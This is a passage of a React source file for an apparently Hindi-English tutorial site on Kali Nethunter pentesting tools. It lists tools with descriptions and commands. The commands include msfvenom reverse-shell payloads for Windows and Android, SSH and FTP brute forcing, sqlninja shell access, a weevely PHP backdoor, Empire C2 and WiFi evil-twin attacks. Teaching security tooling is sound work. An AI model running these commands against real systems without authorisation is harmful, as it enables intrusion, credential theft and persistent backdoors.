    slug: 'empire',
    category: 'Exploitation',
    description: 'PowerShell aur Python post-exploitation framework. Windows, Linux, Mac sab ke liye agents hai. Encrypted C2 channel, credential collection, persistence, lateral movement — sab ek framework mein. Metasploit ka post-exploitation alternative hai.',
    commands: [
      'sudo powershell-empire server      # Server start',
      'sudo powershell-empire client      # Client connect',
      '# Listener create → Stager generate → Agent interact',
    ],
  },
  {
    name: 'netdiscover',
    slug: 'netdiscover',
    category: 'Recon',
    description: 'ARP-based network discovery tool. Local network par kaunse devices hain, unke IP aur MAC addresses kya hain — sab pata karta hai. Passive aur active dono modes hai. Wireless networks ke liye bahut useful hai.',
    commands: [
      'sudo netdiscover -r 192.168.1.0/24 # Network scan',
      'sudo netdiscover -p                 # Passive scan',
      'sudo netdiscover -r 192.168.1.0/24 -f  # Fast scan',
    ],
  },
  {
    name: 'medusa',
    slug: 'medusa',
    category: 'Exploitation',
    description: 'Fast parallel brute force tool. Hydra jaisa hai lekin kuch cases mein faster — parallel connections use karta hai. SSH, FTP, HTTP, SMB, MySQL, RDP — 30+ services support karta hai.',
    commands: [
      'medusa -h target -u admin -P list.txt -M ssh  # SSH brute',
      'medusa -h target -U users.txt -P pass.txt -M ftp  # FTP',
      'medusa -h target -u admin -P list.txt -M http # HTTP auth',
    ],
  },
  {
    name: 'airgeddon',
    slug: 'airgeddon',
    category: 'WiFi',
    description: 'All-in-one WiFi security auditing framework. WPA handshake capture, evil twin attacks, deauthentication, WPS attacks, PMKID capture — sab ek tool mein. Menu-based interface hai, beginners ke liye perfect.',
    commands: [
      'sudo bash airgeddon.sh              # Launch tool',
      '# Menu se: Monitor mode → Target → Attack type',
      '# Evil Twin, Handshake capture, WPS PIN attacks',
    ],
  },
  {
    name: 'hping3',
    slug: 'hping3',
    category: 'Network',
    description: 'Network packet crafting aur scanning tool. Custom TCP/IP packets banata hai. Firewall testing, port scanning, OS fingerprinting, aur network troubleshooting ke liye use hota hai. Nmap se alag hai — specific packet parameters control kar sakta hai.',
    commands: [
      'sudo hping3 -S target_ip -p 80      # TCP SYN scan',
      'sudo hping3 -1 target_ip            # ICMP ping',
      'sudo hping3 -T -p 80 target_ip     # TCP traceroute',
    ],
  },
  {
    name: 'binwalk',
    slug: 'binwalk',
    category: 'Forensics',
    description: 'Firmware analysis aur extraction tool. Binary files mein chhupe file systems, compressed data, aur executable code ko dhundhta aur extract karta hai. IoT security testing aur reverse engineering ke liye essential hai.',
    commands: [
      'binwalk firmware.bin                 # Scan firmware',
      'binwalk -e firmware.bin              # Extract files',
      'binwalk -E firmware.bin              # Entropy analysis',
    ],
  },
  {
    name: 'volatility',
    slug: 'volatility',
    category: 'Forensics',
    description: 'Memory forensics framework. RAM dumps ko analyze karta hai — running processes, network connections, passwords, malware sab nikal sakta hai. Incident response aur digital forensics ka essential tool hai.',
    commands: [
      'vol3 -f dump windows.pslist         # Running processes',
      'vol3 -f dump windows.netscan        # Network connections',
      'vol3 -f dump windows.hashdump       # Password hashes',
    ],
  },
  {
    name: 'msfvenom',
    slug: 'msfvenom',
    category: 'Exploitation',
    description: 'Metasploit payload generator. Windows, Linux, Android, Mac ke liye payloads banata hai — reverse shells, bind shells, meterpreter, shellcode. Payload encoding se AV bypass bhi kar sakta hai.',
    commands: [
      'msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o s.exe',
      'msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o p.apk',
      'msfvenom -l payloads                # List payloads',
    ],
  },
  {
    name: 'radare2',
    slug: 'radare2',
    category: 'Forensics',
    description: 'Reverse engineering aur binary analysis framework. Binary files ko disassemble, debug, analyze, aur patch kar sakta hai. Malware analysis, vulnerability research, aur CTF challenges ke liye bahut useful hai.',
    commands: [
      'r2 binary.elf                        # Open binary',
      'r2 -d binary.elf                     # Debug mode',
      '# aaa = analyze, afl = functions, pdf = disassemble',
    ],
  },
  {
    name: 'sqlninja',
    slug: 'sqlninja',
    category: 'Web',
    description: 'Microsoft SQL Server exploitation tool. SQL injection se MS SQL Server par remote code execution, privilege escalation, aur reverse shell milta hai. Sqlmap generic hai — sqlninja MSSQL specific features use karta hai.',
    commands: [
      'sqlninja -m fingerprint -f config.xml  # Identify MSSQL',
      'sqlninja -m brute -f config.xml       # Bruteforce SA',
      'sqlninja -m cmdshell -f config.xml    # Get shell',
    ],
  },
  {
    name: 'weevely',
    slug: 'weevely',
    category: 'Web',
    description: 'Web shell management aur post-exploitation tool. Stealthy PHP backdoor generate karta hai aur remotely control karta hai. Encrypted communication, WAF evasion, aur post-exploitation modules sab built-in hai.',
    commands: [
      'weevely generate pass shell.php       # Generate shell',
      'weevely http://target/shell.php pass  # Connect',
      '# :net_scan, :sql_console, :file_browse modules',
    ],
  },
]

const categories = ['All', ...new Set(tools.map(t => t.category))]

export default function Tools() {
  const [selectedCategory, setSelectedCategory] = useState('All')
  const [searchTerm, setSearchTerm] = useState('')

  const filteredTools = tools.filter(tool => {
    const matchesCategory = selectedCategory === 'All' || tool.category === selectedCategory
    const matchesSearch = tool.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                          tool.description.toLowerCase().includes(searchTerm.toLowerCase())
    return matchesCategory && matchesSearch
  })

  return (
    <TutorialLayout
      title="Tools Reference"
      subtitle="Nethunter ke penetration testing tools ka complete guide"
      icon="🔧"
      prev={{ to: '/payloads', label: 'Payloads & Attacks' }}
      next={{ to: '/about', label: 'About Nethunter' }}
    >
      <h2>Nethunter Tools Library</h2>
      <p>
        Kali Nethunter mein 600+ security tools hain. Neeche sabse important tools ki list hai jo aapko aani chahiye. Har tool ke saath description aur common commands diye gaye hain. Kisi bhi tool ka naam search karein ya category se filter karein.
      </p>
      <p>
        In tools ko seekhne ka best tarika hai ki aap ek ek karke practice karein. Sabse pehle nmap se shuru karein (network scanning), phir aircrack-ng (WiFi hacking), phir Metasploit (exploitation). Jab basics clear ho jaayein toh advanced tools try karein.
      </p>

      {/* Search */}
      <div className="my-6">
        <input
          type="text"
          placeholder="Tools search karein... (jaise wifi, password, network)"
          value={searchTerm}
          onChange={e => setSearchTerm(e.target.value)}
          className="w-full px-4 py-3 bg-dark-800 border border-neon-green/30 rounded-lg text-white font-mono placeholder-gray-600 focus:outline-none focus:border-neon-green transition-colors"
        />
      </div>

      {/* Category Filter */}
      <div className="flex flex-wrap gap-2 mb-8">
        {categories.map(cat => (
          <button
            key={cat}
            onClick={() => setSelectedCategory(cat)}
            className={`px-3 py-1.5 rounded-lg text-sm font-mono transition-all ${
              selectedCategory === cat
                ? 'bg-neon-green text-dark-900 font-bold'
                : 'bg-dark-700 text-gray-400 hover:text-neon-green border border-dark-600'
            }`}
          >
            {cat}
          </button>
        ))}
      </div>

      {/* Tools Grid */}
      <div className="space-y-6">
        {filteredTools.map(tool => (
          <div key={tool.name} className="glass-card p-6">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-xl font-mono font-bold text-neon-green">{tool.name}</h3>
              <span className="px-2 py-0.5 bg-neon-cyan/10 text-neon-cyan text-xs rounded-full font-mono">
                {tool.category}
              </span>
            </div>
            <p className="text-gray-400 text-sm mb-4">{tool.description}</p>
            <CodeBlock
              title="Common Commands"
              code={tool.commands.join('\n')}
            />
            {tool.slug && (
              <Link
                to={`/tool/${tool.slug}`}
                className="mt-4 inline-block px-4 py-2 bg-neon-green/10 border border-neon-green/30 text-neon-green rounded-lg text-sm font-mono hover:bg-neon-green/20 transition-colors"
              >
                Full Guide →
              </Link>
            )}
          </div>
        ))}
      </div>

      {filteredTools.length === 0 && (
        <div className="text-center py-12 text-gray-500">
          <span className="text-4xl">🔍</span>
          <p className="mt-4">"{searchTerm}" se koi tool nahi mila</p>
        </div>
      )}

      <h2 className="mt-12">Quick Command Cheat Sheet</h2>
      <p>
        Yahan kuch sabse common commands ka quick reference hai. Inhe yaad kar lein — exam mein kaam aayenge! Matlab penetration test mein kaam aayenge:
      </p>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
        <CodeBlock title="Network Recon (Network Scan)" code={`nmap -sn 192.168.1.0/24    # Devices dhundhein
nmap -sV -sC target         # Services detect karein
masscan 10.0.0.0/8 -p 22   # Fast port scan`} />
        <CodeBlock title="WiFi Attacks (WiFi Hacking)" code={`airmon-ng start wlan0       # Monitor mode
airodump-ng wlan0mon        # Networks scan
wifite                      # Automated attack`} />
        <CodeBlock title="Password Cracking (Password Todna)" code={`john --wordlist=rockyou.txt hash.txt
hashcat -m 0 hash.txt wordlist.txt
hydra -l admin -P pass.txt target ssh`} />
        <CodeBlock title="Web Testing (Website Testing)" code={`nikto -h http://target
gobuster dir -u http://target -w list.txt
sqlmap -u "http://target/?id=1"`} />
      </div>

      <h2 className="mt-12">Tools Kaise Seekhein — Learning Path</h2>
      <p>
        Agar aap beginner hain toh sab tools ek saath mat seekhein. Neeche diye gaye order mein seekhein — har tool pehle wale par based hai:
      </p>
      <div className="space-y-3 mt-4">
        {[
          { step: '1', title: 'nmap', desc: 'Network scanning sabse pehle seekhein — yeh foundation hai' },
          { step: '2', title: 'netcat', desc: 'Basic networking concepts samjhein — connections, ports, protocols' },
          { step: '3', title: 'aircrack-ng', desc: 'WiFi hacking seekhein — monitor mode, scanning, cracking' },
          { step: '4', title: 'Wireshark', desc: 'Packet analysis seekhein — traffic ko read karna seekhein' },
          { step: '5', title: 'hydra / john', desc: 'Password attacks seekhein — dictionary aur brute force' },
          { step: '6', title: 'Metasploit', desc: 'Exploitation framework seekhein — payloads, exploits, post-exploitation' },
          { step: '7', title: 'sqlmap / nikto', desc: 'Web application testing seekhain' },
          { step: '8', title: 'bettercap / responder', desc: 'Advanced network attacks — MITM, poisoning' },
        ].map(item => (
          <div key={item.step} className="flex items-start space-x-4 glass-card p-4">
            <div className="flex-shrink-0 w-10 h-10 bg-neon-green/10 border border-neon-green/30 rounded-full flex items-center justify-center text-neon-green font-heading font-bold">
              {item.step}
            </div>
            <div>
              <h4 className="text-white font-mono font-semibold">{item.title}</h4>
              <p className="text-gray-500 text-sm">{item.desc}</p>
            </div>
          </div>
        ))}
      </div>
    </TutorialLayout>
  )
}
